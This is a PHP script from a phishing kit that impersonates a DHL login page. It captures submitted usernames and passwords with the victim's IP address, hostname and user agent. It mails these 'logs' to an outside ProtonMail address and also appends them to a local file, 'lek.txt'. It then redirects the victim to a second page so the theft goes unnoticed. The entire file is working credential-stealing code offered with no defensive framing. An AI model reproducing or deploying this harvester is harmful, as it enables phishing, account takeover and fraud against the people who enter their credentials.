<?php

if($_POST["j_username"] != "" and $_POST["j_password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Dhl Logs-----------------------\n";
$message .= "Email            : ".$_POST['j_username']."\n";
$message .= "Password           : ".$_POST['j_password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "checkscache@protonmail.com";
$subject = "Logs | $ip";
{
mail("$send", "$subject", $message);  

$fp = fopen("lek.txt","a");
fputs($fp,$message);
fclose($fp);
 
}

$praga=rand();
$praga=md5($praga);
  header ("Location: index2.php?email=".$_POST['j_username']);
  
}else{
header ("Location: index2.php?email=".$_POST['j_username']);
}

?>